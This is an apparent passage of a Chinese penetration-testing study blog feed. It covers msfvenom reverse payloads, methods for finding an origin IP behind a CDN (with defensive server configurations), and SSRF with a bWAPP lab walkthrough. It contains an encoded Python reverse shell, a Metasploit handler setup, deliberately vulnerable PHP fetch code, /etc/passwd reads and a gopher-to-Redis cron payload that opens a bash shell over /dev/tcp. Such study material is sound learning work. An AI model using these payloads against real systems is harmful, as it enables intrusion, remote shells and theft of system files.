punctuation">.</span><span class="token number">153.176</span> LPORT<span class="token operator">=</span><span class="token number">4444</span> <span class="token operator">-</span>f raw <span class="token operator">></span> shell<span class="token punctuation">.</span>py</code></pre><p>在kali上使用msf执行下面的命令，监听端口4444：</p><pre class=" language-java"><code class="language-java">msfconsole use exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler set PAYLOAD cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_python set LHOST <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">153.176</span> set LPORT  <span class="token number">4444</span> exploit </code></pre><p>然后复制shell.py中的内容在linux命令行下执行，如下：</p><pre class=" language-java"><code class="language-java">python <span class="token operator">-</span>c <span class="token string">"exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ=='.decode('base64'))"</span></code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200427150606.png" alt=""></p><p>结果如图：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200427150633.png" alt=""></p><h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://xz.aliyun.com/t/2380" target="_blank" rel="noopener">https://xz.aliyun.com/t/2380</a></p><p><a href="https://blog.51cto.com/13539934/2113551" target="_blank" rel="noopener">https://blog.51cto.com/13539934/2113551</a></p><p>[<a href="https://www.sariel.top/2019/08/19/Linux/kali/msfconsole/msfvenom/msfvenom%E5%90%8E%E9%97%A8%E5%AD%A6%E4%B9%A0-windows%E7%AF%87/#o-%E6%96%87%E4%BB%B6%E8%BE%93%E5%87%BA]" target="_blank" rel="noopener">https://www.sariel.top/2019/08/19/Linux/kali/msfconsole/msfvenom/msfvenom%E5%90%8E%E9%97%A8%E5%AD%A6%E4%B9%A0-windows%E7%AF%87/#o-%E6%96%87%E4%BB%B6%E8%BE%93%E5%87%BA]</a>(</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;学习msfvenom生成反弹payload总结&quot;&gt;&lt;a href=&quot;#学习msfvenom生成反弹payload总结&quot; class=&quot;headerlink&quot; title=&quot;学习msfvenom生成反弹payload总结&quot;&gt;&lt;/a&gt;学习msfvenom生成反弹pay
      
    
    </summary>
    
    
      <category term="渗透测试学习" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="msf" scheme="https://shu1l.github.io/tags/msf/"/>
    
  </entry>
  
  <entry>
    <title>绕过CDN查找ip方法总结</title>
    <link href="https://shu1l.github.io/2020/04/27/rao-guo-cdn-cha-zhao-ip-fang-fa-zong-jie/"/>
    <id>https://shu1l.github.io/2020/04/27/rao-guo-cdn-cha-zhao-ip-fang-fa-zong-jie/</id>
    <published>2020-04-27T02:54:39.000Z</published>
    <updated>2020-04-27T11:40:27.140Z</updated>
    
    <content type="html"><![CDATA[<h2 id="绕过CDN查找真实IP方法总结"><a href="#绕过CDN查找真实IP方法总结" class="headerlink" title="绕过CDN查找真实IP方法总结"></a>绕过CDN查找真实IP方法总结</h2><h4 id="什么是CDN以及CDN加速？"><a href="#什么是CDN以及CDN加速？" class="headerlink" title="什么是CDN以及CDN加速？"></a>什么是CDN以及CDN加速？</h4><p><strong>(摘自百度百科）</strong></p><p>​        CDN的全称是Content Delivery Network，即<a href="https://baike.baidu.com/item/内容分发网络/4034265" target="_blank" rel="noopener">内容分发网络</a>。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p><p><img src="4610b912c8fcc3ce005c05d19c45d688d53f20b0%5B1%5D.png" alt=""></p><p>比较常见的基于公有云的高可用架构，即：</p><pre><code>域名--&gt;CDN，CDN--&gt;WAF，WAF--&gt;SLB，SLB--&gt;ECS</code></pre><p><strong>CDN对网站有什么好处?</strong></p><p>​    首先，开启CDN后的网站，会根据用户所在地的不同访问CDN的节点服务器，并不直接访问源服务器，这样可以减少网站服务器宽带资源,降低服务器压力。这也就是大家都在ping百度,但是不同地区得到的反馈ip不一样的原因。</p><p>​    其次，由于CDN节点的阻挡防护，可以更好的保护员服务器的安全。具体来说，CDN其实是充当了一个替身的角色，无论服务器是渗透还是DD0S攻击，攻击的目标都将是CDN节点，这样一来便间接的保护了网站本身。</p><p><strong>为什么我们需要绕过CDN？</strong></p><pre><code>   对于我们渗透测试者来说，我们在信息收集中重要的一步就是要得到目标服务器主机的**真实IP地址**，但如果目标服务器部署了CDN服务，那么往往我们直接访问得到的IP只是CDN节点服务器的IP，而不是真实的源服务器的IP地址，这是就需要我们想办法绕过CDN获取源服务器IP。</code></pre><p>下面我收集了一些常见的绕过CDN的方法，留作记录:</p><h4 id="验证是否存在CDN"><a href="#验证是否存在CDN" class="headerlink" title="验证是否存在CDN"></a>验证是否存在CDN</h4><h5 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h5><p>很简单，使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：<br> <a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a><br> <a href="http://ping.aizhan.com/" target="_blank" rel="noopener">http://ping.aizhan.com/</a><br> <a href="http://ce.cloud.360.cn/" target="_blank" rel="noopener">http://ce.cloud.360.cn/</a></p><p>我们这里打开第一个网站：ping一下<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200427093341.png" alt=""></p><p>这里可以看出百度的独立IP有17个，且各个节点的返回速度存在不同的延迟。说明百度采用了CDN服务，但是ping没有办法确认真实IP。</p><h5 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h5><p>使用 nslookup 进行检测，原理同上，如果返回域名解析对应多个 IP 地址多半是使用了 CDN。有 CDN 的示例：</p><blockquote><p> <a href="http://www.163.com/" target="_blank" rel="noopener">www.163.com</a><br> 服务器:  public1.114dns.com<br> Address:  114.114.114.114</p><p> 非权威应答:<br> 名称:    163.xdwscache.ourglb0.com<br> Addresses:  58.223.164.86</p><p> ​          125.75.32.252<br> Aliases:  <a href="http://www.163.com/" target="_blank" rel="noopener">www.163.com</a></p><p> ​          <a href="http://www.163.com.lxdns.com/" target="_blank" rel="noopener">www.163.com.lxdns.com</a></p></blockquote><p>无 CDN 的示例：</p><blockquote><p> xiaix.me<br> 服务器:  public1.114dns.com<br> Address:  114.114.114.114</p><p> 非权威应答:<br> 名称:    xiaix.me<br> Address:  192.3.168.172  </p></blockquote><p>下面我收集了一些常见的绕过CDN查找真实IP的方法，留作记录:</p><h4 id="绕过-CDN-查找网站真实-IP"><a href="#绕过-CDN-查找网站真实-IP" class="headerlink" title="绕过 CDN 查找网站真实 IP"></a>绕过 CDN 查找网站真实 IP</h4><h5 id="1-查询历史DNS记录"><a href="#1-查询历史DNS记录" class="headerlink" title="1:查询历史DNS记录"></a>1:查询历史DNS记录</h5><p>1）查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：<br> <a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a>     ###DNS查询<br> <a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a>    ###微步在线<br> <a href="http://toolbar.netcraft.com/site_report?url=" target="_blank" rel="noopener">http://toolbar.netcraft.com/site_report?url=</a>    ###在线域名信息查询<br> <a href="http://viewdns.info/" target="_blank" rel="noopener">http://viewdns.info/</a>        ###DNS、IP等查询<br> <a href="https://tools.ipip.net/cdn.php" target="_blank" rel="noopener">https://tools.ipip.net/cdn.php</a>  ###CDN查询IP</p><p>2）利用<a href="https://securitytrails.com/" target="_blank" rel="noopener">SecurityTrails</a>平台，攻击者就可以精准的找到真实原始IP。他们只需在搜索字段中输入网站域名，然后按Enter键即可，这时“历史数据”就可以在左侧的菜单中找到。</p><p>如何寻找隐藏在CloudFlare或TOR背后的真实原始IP</p><p><img src="1058583-20181009230838766-860479177%5B1%5D.png" alt=""></p><p>除了过去的DNS记录，即使是当前的记录也可能泄漏原始服务器IP。例如，MX记录是一种常见的查找IP的方式。如果网站在与web相同的服务器和IP上托管自己的邮件服务器，那么原始服务器IP将在MX记录中。</p><p><strong>MX记录</strong></p><p>邮件交换记录 (<strong>MX record</strong>)是域名系统（DNS）中的一种资源记录类型，用于指定负责处理发往收件人域名的邮件服务器</p><h5 id="2-查询子域名寻找真实IP"><a href="#2-查询子域名寻找真实IP" class="headerlink" title="2.查询子域名寻找真实IP"></a>2.查询子域名寻找真实IP</h5><p>毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。</p><p>下面介绍些常用的子域名查找的方法和工具：</p><p>1）微步在线(<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a>)</p><p>上文提到的微步在线功能强大，黑客只需输入要查找的域名(如baidu.com)，点击子域名选项就可以查找它的子域名了，但是免费用户每月只有5次免费查询机会。如图：</p><p><img src="1058583-20181009230922994-1826758810%5B1%5D.png" alt=""></p><p>2）Dnsdb查询法。(<a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a>)</p><p>黑客只需输入baidu.com type:A就能收集百度的子域名和ip了。如图：<br> <img src="QQ%E6%88%AA%E5%9B%BE20200427094630.png" alt=""></p><p>3）Google 搜索</p><p>Google site:baidu.com -www就能查看除www外的子域名，如图：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200427095533.png" alt=""></p><p>4）各种子域名扫描器</p><p>这里，主要为大家推荐子域名挖掘机和lijiejie的subdomainbrute(<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a>)</p><p>子域名挖掘机仅需输入域名即可基于字典挖掘它的子域名，如图：</p><p><img src="1058583-20181009231018377-2070670991%5B1%5D.png" alt=""></p><p>Subdomainbrute以windows为例，黑客仅需打开cmd进入它所在的目录输入</p><p><code>Python subdomainbrute.py baidu.com --full</code></p><p>即可收集百度的子域名，如图：</p><p><img src="1058583-20181009231030794-1664451845%5B1%5D.png" alt=""></p><p>注：收集子域名后尝试以解析ip不在cdn上的ip解析主站，真实ip成功被获取到。</p><h5 id="3：网络空间引擎搜索法"><a href="#3：网络空间引擎搜索法" class="headerlink" title="3：网络空间引擎搜索法"></a>3：网络空间引擎搜索法</h5><p>常见的有以前的钟馗之眼，<a href="https://www.shodan.io/" target="_blank" rel="noopener">shodan</a>，<a href="https://fofa.so/" target="_blank" rel="noopener">fofa搜索</a>。以fofa为例，只需输入：title:“网站的title关键字”或者body：“网站的body特征”就可以找出fofa收录的有这些关键字的ip域名，很多时候能获取网站的真实ip，如图：</p><p> <img src="1058583-20181009231044976-1731199101%5B1%5D.png" alt=""></p><h5 id="4-利用SSL证书寻找真实原始IP"><a href="#4-利用SSL证书寻找真实原始IP" class="headerlink" title="4:利用SSL证书寻找真实原始IP"></a>4:利用SSL证书寻找真实原始IP</h5><p><strong>SSL证书</strong></p><p>​        SSL证书是<a href="https://baike.baidu.com/item/数字证书/326874" target="_blank" rel="noopener">数字证书</a>的一种，类似于驾驶证、护照和营业执照的电子副本。因为配置在服务器上，也称为SSL服务器证书。SSL 证书就是遵守 SSL协议，由受信任的数字证书颁发机构CA，在验证服务器身份后颁发，具有服务器身份验证和数据传输加密功能。</p><p>​        以CloudFlare这款CDN加速器举例：假如你在 abc.com 上托管了一个服务，原始服务器IP是136.23.63.44。 而CloudFlare则会为你提供DDoS保护，Web应用程序防火墙和其他一些安全服务，以保护你的服务免受攻击。</p><p>​        为此，你的Web服务器就必须支持SSL并具有证书，此时CloudFlare与你的服务器之间的通信，就像你和CloudFlare之间的通信一样，会被加密（即没有灵活的SSL存在）。这看起来很安全，但问题是，当你在端口443<code>https://136.23.63.44:443</code>上直接连接到IP时，SSL证书就会被暴露。</p><p>​        此时，如果攻击者扫描0.0.0.0/0，即整个互联网，他们就可以在端口443上获取在 aaa.com上的有效证书，进而获取提供给你的Web服务器IP。</p><p><a href="https://link.zhihu.com/?target=https%3A//censys.io/certificates/">https://censys.io/certificates/</a> 通过SSL证书查询真实IP（推荐）</p><p><strong>Censys证书查询搜索步骤如下：</strong></p><p>1、aaa.com 证书的搜索查询参数为：<code>parsed.names：aaa.com</code></p><p>只显示有效证书的查询参数为：<code>tags.raw：trusted</code></p><p>攻击者可以在Censys上实现多个参数的组合，这可以通过使用简单的布尔逻辑来完成。</p><p>2、组合后的搜索参数为：<code>parsed.names: aaa.com and tags.raw: trusted</code></p><p>3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的“<strong>Explore</strong>”，打开包含多个工具的下拉菜单。What’s using this certificate? &gt; <strong>IPv4 Hosts</strong>；</p><p>隐藏服务具有SSL证书，要查找它使用的IPv4，只需将”SHA1 fingerprint”（签名证书的sha1值，也就是SHA1指纹）粘贴到Censys平台IPv4主机搜索中，即可找到证书，使用此方法可以轻松找到配置错误的Web服务器真实IP。</p><h5 id="方法5-利用HTTP标头寻找真实原始IP"><a href="#方法5-利用HTTP标头寻找真实原始IP" class="headerlink" title="方法5:利用HTTP标头寻找真实原始IP"></a>方法5:利用HTTP标头寻找真实原始IP</h5><p>借助SecurityTrails这样的平台，任何人都可以在茫茫的大数据搜索到自己的目标，甚至可以通过比较HTTP标头来查找到原始服务器。</p><p>特别是当用户拥有一个非常特别的服务器名称与软件名称时，攻击者找到你就变得更容易。</p><p>如果要搜索的数据相当多，如上所述，攻击者可以在Censys上组合搜索参数。假设你正在与1500个Web服务器共享你的服务器HTTP标头，这些服务器都发送的是相同的标头参数和值的组合。而且你还使用新的PHP框架发送唯一的HTTP标头（例如：X-Generated-Via：XYZ框架），目前约有400名网站管理员使用了该框架。而最终由三个服务器组成的交集，只需手动操作就可以找到了IP，整个过程只需要几秒钟。</p><p>例如，Censys上用于匹配服务器标头的搜索参数是80.http.get.headers.server :，查找由CloudFlare提供服务的网站的参数如下</p><p>80.http.get.headers.server:cloudflare</p><p><img src="1058583-20181009231212219-1764707602%5B1%5D.png" alt=""></p><h5 id="方法6-利用网站返回的内容寻找真实原始IP"><a href="#方法6-利用网站返回的内容寻找真实原始IP" class="headerlink" title="方法6:利用网站返回的内容寻找真实原始IP"></a>方法6:利用网站返回的内容寻找真实原始IP</h5><p>如果原始服务器IP也返回了网站的内容，那么可以在网上搜索大量的相关数据。</p><p>浏览网站源代码，寻找独特的代码片段。在JavaScript中使用具有访问或标识符参数的第三方服务（例如Google Analytics，reCAPTCHA）是攻击者经常使用的方法。</p><p>以下是从HackTheBox网站获取的Google Analytics跟踪代码示例：</p><pre><code>ga（&#39;create&#39;，&#39;UA-93577176-1&#39;，&#39;auto&#39;）;</code></pre><p>​        可以使用80.http.get.body：参数通过body/source过滤Censys数据，不幸的是，正常的搜索字段有局限性，但你可以在Censys请求研究访问权限，该权限允许你通过Google BigQuery进行更强大的查询。</p><p><strong>Shodan</strong></p><p>Shodan是一种类似于Censys的服务，也提供了http.html搜索参数。</p><h5 id="7-使用国外主机解析域名"><a href="#7-使用国外主机解析域名" class="headerlink" title="7:使用国外主机解析域名"></a>7:使用国外主机解析域名</h5><p>​        国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP。</p><p>​       我这里通过国外主机nslookup查询国内163.com对应IP。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200427095107.png" alt=""></p><p>我们可以看到只返回了一条对应IP，猜测应该是真实IP。</p><p>这里推荐一个国外的多节点ping工具。</p><p>域名：<a href="http://www.just-ping.com/" target="_blank" rel="noopener">http://www.just-ping.com/</a></p><h5 id="8-网站漏洞查找"><a href="#8-网站漏洞查找" class="headerlink" title="8:网站漏洞查找"></a>8:网站漏洞查找</h5><p>1.目标敏感文件泄露，例如：phpinfo之类的探针、GitHub信息泄露等。</p><p> 2.XSS盲打，命令执行反弹shell，SSRF等。可以让服务器主动访问我们预设的web服务器，那么就能在日志里面看见目标网站服务器的真实IP。</p><p> 3.无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。</p><h5 id="9-网站邮件订阅查找"><a href="#9-网站邮件订阅查找" class="headerlink" title="9:网站邮件订阅查找"></a>9:网站邮件订阅查找</h5><p>RSS邮件订阅，很多网站都自带 sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。</p><h4 id="如何防止CDN被绕过？"><a href="#如何防止CDN被绕过？" class="headerlink" title="如何防止CDN被绕过？"></a>如何防止CDN被绕过？</h4><p>通过中间件配置只允许域名访问，禁止ip访问。</p><p>这样处理的话，所有直接访问站点真实IP的请求将会被拒绝，任何用户只能通过域名访问站点，通过预先设定的网络链路，从DNS→CDN→waf防护→源站，所有的域名访问请求都必须经过WAF检测。</p><h5 id="Nginx参考配置："><a href="#Nginx参考配置：" class="headerlink" title="Nginx参考配置："></a>Nginx参考配置：</h5><pre><code>#添加一个server,在原server里绑定域名server  {        listen 80 default;        server_name _;        return 403;    }server {        listen       80;        server_name  www.demo.com;        .........</code></pre><h5 id="Apache参考配置"><a href="#Apache参考配置" class="headerlink" title="Apache参考配置:"></a>Apache参考配置:</h5><pre><code>#在httpd.conf最后面加上&lt;VirtualHost 此处填写IP&gt;        ServerName 此处填写IP        &lt;Location /&gt;            Order Allow,Deny            Deny from all        &lt;/Location&gt;&lt;/VirtualHost&gt;&lt;VirtualHost 此处填写IP&gt;        DocumentRoot /var/www/html        ServerName   此处填写域名&lt;/VirtualHost&gt;</code></pre><h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://zhuanlan.zhihu.com/p/116026247" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/116026247</a></p><p><a href="https://zhuanlan.zhihu.com/p/107294740" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/107294740</a></p><p><a href="https://www.fujieace.com/penetration-test/cdn-find-ip.html" target="_blank" rel="noopener">https://www.fujieace.com/penetration-test/cdn-find-ip.html</a></p><p><a href="https://forum.90sec.com/t/topic/524" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/524</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;绕过CDN查找真实IP方法总结&quot;&gt;&lt;a href=&quot;#绕过CDN查找真实IP方法总结&quot; class=&quot;headerlink&quot; title=&quot;绕过CDN查找真实IP方法总结&quot;&gt;&lt;/a&gt;绕过CDN查找真实IP方法总结&lt;/h2&gt;&lt;h4 id=&quot;什么是CDN以及CDN加速
      
    
    </summary>
    
    
      <category term="渗透测试学习" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="绕过CDN" scheme="https://shu1l.github.io/tags/%E7%BB%95%E8%BF%87CDN/"/>
    
  </entry>
  
  <entry>
    <title>我的SSRF漏洞学习</title>
    <link href="https://shu1l.github.io/2020/04/20/ssrf-lou-dong-xue-xi/"/>
    <id>https://shu1l.github.io/2020/04/20/ssrf-lou-dong-xue-xi/</id>
    <published>2020-04-20T06:42:33.000Z</published>
    <updated>2020-04-27T11:43:35.931Z</updated>
    
    <content type="html"><![CDATA[<h3 id="SSRF漏洞部分"><a href="#SSRF漏洞部分" class="headerlink" title="SSRF漏洞部分"></a>SSRF漏洞部分</h3><h4 id="SSRF简述"><a href="#SSRF简述" class="headerlink" title="SSRF简述"></a>SSRF简述</h4><p><img src="20181227082125119.png" alt=""></p><p>​       SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><h5 id="漏洞形成原因"><a href="#漏洞形成原因" class="headerlink" title="漏洞形成原因"></a>漏洞形成原因</h5><p>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><p>例如：</p><p><code>www.xxx.com/a.php?image=http://www.abc.com/1.jpg</code></p><p>如果我们将<a href="http://www.abc.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？" target="_blank" rel="noopener">http://www.abc.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？</a></p><p>如果存在该内网地址就会返回1xx 2xx 之类的状态码，不存在就会其他的状态码</p><p>SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有发现这个请求是否合法，然后服务器以他的身份来访问其他服务器的资源。</p><p><strong>curl造成的SSRF</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$URL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>file_get_contents造成的SSRF</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h5 id="SSRF常见出现位置"><a href="#SSRF常见出现位置" class="headerlink" title="SSRF常见出现位置"></a>SSRF常见出现位置</h5><ul><li>分享：通过URL地址分享网页内容</li><li>转码服务</li><li>在线翻译</li><li>图片加载与下载：通过URL地址加载或下载图片</li><li>图片、文章收藏功能</li><li>未公开API实现以及其他调用URL的功能</li></ul><h5 id="SSRF验证方法"><a href="#SSRF验证方法" class="headerlink" title="SSRF验证方法"></a>SSRF验证方法</h5><p>1.因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的来判断是否存在SSRF漏洞</p><p>2.在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></p><h5 id="利用SSRF漏洞"><a href="#利用SSRF漏洞" class="headerlink" title="利用SSRF漏洞"></a>利用SSRF漏洞</h5><ol><li>让服务器去访问相应的网址</li><li>让服务器去访问自己所处内网的一些指纹文件来判断是否存在相应的CMS</li><li>可以使用file、dict、gopher、ftp协议进行请求访问相应的文件</li><li>攻击运行在内网或本地的应用程序（比如溢出）;</li><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</li></ol><p>SSRF中各个编程语言可以使用的协议如下图所示：</p><p><img src="12.png" alt=""></p><ul><li><p>file协议</p><p>​    查看文件：file:///etc/passwd</p></li><li><p>dict协议</p><p>​    探测端口：dict://127.0.0.1:80</p></li><li><p>gopher协议</p><p>​    Gopher协议可以做很多，特别是在SSRF漏洞中可以发挥很多重要的作用，利用此协议可以攻击内网的FTP、Telnet Redis Memcache 也可以进行GET POST请求 .</p><pre><code>curl -v &#39;http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&#39;</code></pre></li></ul><ol><li>攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包）</li><li>攻击内网应用程序（利用跨协议通信技术）</li><li>DOS攻击</li><li>判断内网主机是否存活：访问是否有端口开放</li></ol><h5 id="常见的绕过方法"><a href="#常见的绕过方法" class="headerlink" title="常见的绕过方法"></a>常见的绕过方法</h5><ul><li><p>@绕过：<code>http://xxx.com@10.10.10.10=10.10.10.10</code></p></li><li><p>利用特殊的域名</p></li><li><p>利用句号</p><p>127。0。0。1=&gt;127.0.0.1</p></li><li><p>利用协议</p></li><li><p>利用Enclosed </p></li><li><p>IP使用其他进制：127.0.0.1=2130706433</p></li><li><p>使用短地址：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> ==<a href="https://dwz.lc/2fGYWaE" target="_blank" rel="noopener">https://dwz.lc/2fGYWaE</a></p></li></ul><h5 id=""><a href="#" class="headerlink" title=""></a><img src="QQ%E6%88%AA%E5%9B%BE20200212110340.png" alt=""></h5><h4 id="bWAPP靶场实战（SSRF"><a href="#bWAPP靶场实战（SSRF" class="headerlink" title="bWAPP靶场实战（SSRF)"></a>bWAPP靶场实战（SSRF)</h4><h5 id="一、使用（RFI）远程文件包含进行端口扫描（内网探测）"><a href="#一、使用（RFI）远程文件包含进行端口扫描（内网探测）" class="headerlink" title="一、使用（RFI）远程文件包含进行端口扫描（内网探测）"></a>一、使用（RFI）远程文件包含进行端口扫描（内网探测）</h5><p>我们进入bWAPP  SSRF部分。</p><img src="QQ截图20200128162933.png" style="zoom:50%;" /><p>我们点击黑体字Port scan得到了端口扫描的攻击脚本</p><img src="QQ截图20200128163234.png" style="zoom:50%;" /><p>我们退出SSRF模块 进入（RFI/LFI)模块，发现?language=lang_en.php此处可能存在文件包含漏洞。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128163521.png" alt=""></p><p>我们在VM中开启了虚拟机，得知IP为192.168.153.131</p><img src="QQ截图20200128164256.png" style="zoom:50%;" /><h5 id="二、使用XXE获取敏感文件中的内容"><a href="#二、使用XXE获取敏感文件中的内容" class="headerlink" title="二、使用XXE获取敏感文件中的内容"></a>二、使用XXE获取敏感文件中的内容</h5><p>我们先点击黑体字获取XXE攻击脚本。</p><img src="QQ截图20200128170206.png" style="zoom:67%;" /><p><img src="QQ%E6%88%AA%E5%9B%BE20200128170255.png" alt=""></p><p> 然后使用Burp抓包后发送到Repeater模块，</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128171953.png" alt=""></p><p> 第一次我们使用http协议读取robots.txt文件内容</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128175808.png" alt=""></p><p>第二次我们使用php协议读取 xml页面中的内容</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128175940.png" alt=""></p><p>第三次我们使用file协议读取本机的/etc/passwd的内容</p><img src="QQ截图20200128180043.png" style="zoom:67%;" /><h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://xz.aliyun.com/t/7333" target="_blank" rel="noopener">https://xz.aliyun.com/t/7333</a></p><p><a href="https://damit5.com/2018/05/26/SSRF-漏洞学习" target="_blank" 